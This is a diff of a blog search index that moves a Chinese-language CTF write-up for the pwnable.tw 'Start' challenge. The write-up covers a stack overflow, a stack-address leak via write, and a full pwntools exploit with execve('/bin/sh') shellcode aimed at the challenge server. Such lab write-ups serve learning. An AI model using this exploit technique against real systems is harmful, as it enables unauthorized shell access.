@@ -15,46 +15,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Start</title>
-    <url>/Start/</url>
-    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
-
-<hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
-<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
-<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
-<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
-<p>很明显的栈溢出</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
-<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
-<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
-<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
-<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>
-
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>pwnable.tw</category>
-      </categories>
-      <tags>
-        <tag>stackoverflow</tag>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>calc</title>
     <url>/calc/</url>
     <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>
@@ -130,6 +90,46 @@
       </categories>
       <tags>
         <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Start</title>
+    <url>/Start/</url>
+    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
+
+<hr>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
+<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
+<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
+<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
+<p>很明显的栈溢出</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
+<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
+<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
+<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
+<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>stackoverflow</tag>
       </tags>
   </entry>
 </search>
